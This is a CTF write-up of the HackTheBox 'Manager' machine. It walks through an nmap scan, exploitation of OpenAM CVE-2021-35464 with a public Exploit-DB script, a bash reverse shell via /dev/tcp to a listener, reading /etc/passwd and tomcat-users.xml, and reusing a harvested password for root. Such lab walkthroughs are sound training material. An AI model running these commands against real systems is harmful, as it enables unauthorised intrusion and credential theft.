---
title: "HackTheBox Business CTF 2021 - Manager (Fullpwn)"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: true
categories: 
  - HackTheBox
  - HackTheBox Business CTF 2021
  - CTF
tags:
  - HackTheBox Business CTF 2021
  - OpenAM Community Edition
  - CVE-2021-35464
last_modified_at: 2021-07-26T26:58:26+08:00
toc: true
toc_label: "Contents"
---

Manager is a fullpwn machine from [HackTheBox Business CTF 2021](https://www.hackthebox.eu/htb-business-ctf-2021?utm_source=website&utm_medium=banner&utm_campaign=business_ctf). Our team has solved this machine in the first round. The vulnerability is `ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthenticated)` or `CVE-2021-35464`. To get PrivEsc, we need login as root using `tomcat` credential.

# Network Scanning
First we need to know about all open ports, service version, hostname on the target.
```bash
# Nmap 7.91 scan initiated Fri Jul 23 19:09:30 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_manager 10.129.171.179
Increasing send delay for 10.129.171.179 from 0 to 5 due to 1227 out of 3067 dropped probes since last increase.
Nmap scan report for 10.129.171.179
Host is up, received reset ttl 63 (0.24s latency).
Scanned at 2021-07-23 19:09:31 WIB for 1210s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
1689/tcp  open  java-rmi    syn-ack ttl 63 Java RMI
4444/tcp  open  ssl/krb524? syn-ack ttl 63
8080/tcp  open  http        syn-ack ttl 63 Apache Tomcat 9.0.48
39849/tcp open  java-rmi    syn-ack ttl 63 Java RMI
50389/tcp open  unknown     syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     Cannot decode the provided ASN.1 integer element because the length of the element value was not between one and four bytes (actual length was 0)
|     1.3.6.1.4.1.1466.20036
|   DNSVersionBindReqTCP: 
|     ?Cannot decode the provided ASN.1 sequence as an LDAP message because the second element of the sequence could not be decoded as the protocol op: org.opends.server.types.LDAPException: Cannot decode the provided ASN.1 element as an LDAP protocol op because the element had an invalid BER type (0) for an LDAP protocol op
|     1.3.6.1.4.1.1466.20036
|   RPCCheck: 
|     qCannot decode the ASN.1 element because an unexpected end of file was reached while reading the first length byte
|_    1.3.6.1.4.1.1466.20036
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50389-TCP:V=7.91%I=7%D=7/23%Time=60FAB5DC%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,99,"0\x81\x96\x02\x01\0x\x81\x90\n\x01\x02\x04\0\x04qCannot\x20
SF:decode\x20the\x20ASN\.1\x20element\x20because\x20an\x20unexpected\x20en
SF:d\x20of\x20file\x20was\x20reached\x20while\x20reading\x20the\x20first\x
SF:20length\x20byte\x8a\x161\.3\.6\.1\.4\.1\.1466\.20036")%r(DNSVersionBin
SF:dReqTCP,16B,"0\x82\x01g\x02\x01\0x\x82\x01`\n\x01\x02\x04\0\x04\x82\x01
SF:\?Cannot\x20decode\x20the\x20provided\x20ASN\.1\x20sequence\x20as\x20an
SF:\x20LDAP\x20message\x20because\x20the\x20second\x20element\x20of\x20the
SF:\x20sequence\x20could\x20not\x20be\x20decoded\x20as\x20the\x20protocol\
SF:x20op:\x20org\.opends\.server\.types\.LDAPException:\x20Cannot\x20decod
SF:e\x20the\x20provided\x20ASN\.1\x20element\x20as\x20an\x20LDAP\x20protoc
SF:ol\x20op\x20because\x20the\x20element\x20had\x20an\x20invalid\x20BER\x2
SF:0type\x20\(0\)\x20for\x20an\x20LDAP\x20protocol\x20op\x8a\x161\.3\.6\.1
SF:\.4\.1\.1466\.20036")%r(DNSStatusRequestTCP,BA,"0\x81\xb7\x02\x01\0x\x8
SF:1\xb1\n\x01\x02\x04\0\x04\x81\x91Cannot\x20decode\x20the\x20provided\x2
SF:0ASN\.1\x20integer\x20element\x20because\x20the\x20length\x20of\x20the\
SF:x20element\x20value\x20was\x20not\x20between\x20one\x20and\x20four\x20b
SF:ytes\x20\(actual\x20length\x20was\x200\)\x8a\x161\.3\.6\.1\.4\.1\.1466\
SF:.20036");
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/23%OT=22%CT=1%CU=%PV=Y%G=N%TM=60FAB635%P=x86_64-pc-linux-gnu)
ECN(R=N)
T1(R=N)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=N)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=N)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   271.70 ms 10.10.14.1
2   ... 30

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 23 19:29:41 2021 -- 1 IP address (1 host up) scanned in 1211.21 seconds
```
Before we enumerate target machine, we add `manager.htb` to `/etc/hosts` in our kali linux machine.
# Enumeration
After we have results from nmap, we need to enumerate all open ports. In this case we found some ports such as:
- Port 22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0);
- Port 1689,39849 Java RMI;
- Port 8080 Apache Tomcat 9.0.48;
- Port 5038963 LDAP;

and the operating system is `Ubuntu Linux`

**Port 8080**

Go to web browser and access the `manager.htb:8080`. Port 8080 is `OpenAM - Community Edition` service.
![OpenAM-Community-Edition](/assets/images/htbbiz2021-manager/openam.png)

Let's find the vulnerability using `searchploit`
```bash
$ searchsploit OpenAM
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthent | java/webapps/50131.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The vulnerability is `ForgeRock Access Manager/OpenAM 14.6.3 - Remote Code Execution (RCE) (Unauthenticated)` or [https://www.exploit-db.com/exploits/50131](https://www.exploit-db.com/exploits/50131) from exploit.db

![CVE-2021-35464](/assets/images/htbbiz2021-manager/exploit-db.png)

Copy the python exploit to our directory 
```bash
$ searchploit -m java/webapps/50131.py
```

# Gaining Access
We can run exploit to get information about `/etc/passwd` using command `python3 50131.py -c 'cat /etc/passwd' http://manager.htb:8080/openam`.
```bash
$ python3 50131.py -c 'cat /etc/passwd' http://manager.htb:8080/openam
[!] Verifying reachability of http://manager.htb:8080/openam/
[+] Endpoint http://manager.htb:8080/openam/ reachable
[!] Finding correct OpenAM endpoint
[+] Found potential vulnerable endpoint: http://manager.htb:8080/openam/oauth2/..;/ccversion/Version
[+] !SUCCESS! Host http://manager.htb:8080/openam/ is vulnerable to CVE-2021-35464
[+] Running command "cat /etc/passwd" now:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:1001:1001::/opt/tomcat:/bin/false
```
Next,how we get the target shell?,so we can using this command `python3 50131.py -c "/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1'"`, and prepare netcat listener `nc -lvnp 4444` on our kali linux machine.
```bash
$ python3 50131.py -c "/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1'" http://manager.htb:8080/openam
[!] Verifying reachability of http://manager.htb:8080/openam/
[+] Endpoint http://manager.htb:8080/openam/ reachable
[!] Finding correct OpenAM endpoint
[+] Found potential vulnerable endpoint: http://manager.htb:8080/openam/oauth2/..;/ccversion/Version
[+] !SUCCESS! Host http://manager.htb:8080/openam/ is vulnerable to CVE-2021-35464
[+] Running command "/usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.14.49/4444 0>&1'" now:
```
netcat listener `nc -lvnp 4444`
```bash
$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.171.179.
Ncat: Connection from 10.129.171.179:46620.
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@manager:/$
```
Next we need enumerate `tomcat` directory
```bash
tomcat@manager:~$ ls -la
ls -la
total 68
drwxr-xr-x 13 tomcat tomcat 4096 Jul  2 18:01 .
drwxr-xr-x  3 root   root   4096 Jul  1 12:11 ..
lrwxrwxrwx  1 root   root      9 Jul  2 11:26 .bash_history -> /dev/null
-rw-r--r--  1 tomcat tomcat  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 tomcat tomcat 3771 Feb 25  2020 .bashrc
drwxr-x---  2 tomcat tomcat 4096 Jul  2 17:19 .openamcfg
-rw-r--r--  1 tomcat tomcat  807 Feb 25  2020 .profile
drwxr-xr-x  4 root   root   4096 Jul  2 17:13 accessmanager
drwxr-xr-x  2 tomcat tomcat 4096 Jun 10 11:22 bin
drwxr-xr-x  3 tomcat tomcat 4096 Jul  2 17:40 conf
drwxr-x---  2 tomcat tomcat 4096 Jul  1 14:33 config
drwxr-xr-x  2 tomcat tomcat 4096 Jun 10 11:22 lib
drwxr-xr-x  2 tomcat tomcat 4096 Jul 23 12:02 logs
drwxr-x---  7 tomcat tomcat 4096 Jul  2 17:19 openam
drwxr-xr-x  2 tomcat tomcat 4096 Jul 23 12:02 temp
-r--------  1 tomcat tomcat   52 Jul  2 18:01 user.txt
drwxr-xr-x  5 tomcat tomcat 4096 Jul  2 17:53 webapps
drwxr-xr-x  3 tomcat tomcat 4096 Jul  1 12:23 work
```
`user.txt` flag
```bash
tomcat@manager:~$ cat user.txt
cat user.txt
HTB{1n53cur3_d353r14l1z4710n_c4n_b3_v3ry_d4n63r0u5}
tomcat@manager:~$
```

# Privilege Escalation
Let's find tomcat credential on `/opt/tomcat/conf/tomcat-users.xml`
```bash
tomcat@manager:~/conf$ cat tomcat-users.xml | grep password
cat tomcat-users.xml | grep password
  you must define such a user - the username and password are arbitrary.
  will also need to set the passwords to something appropriate.
  <user username="admin" password="BXJ^JA3y4!nE8x9q" roles="admin-gui"/>
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
```
Now, we have tomcat creds `admin:BXJ^JA3y4!nE8x9q`. Let's login as `root` using tomcat's password.
![root](/assets/images/htbbiz2021-manager/root.png)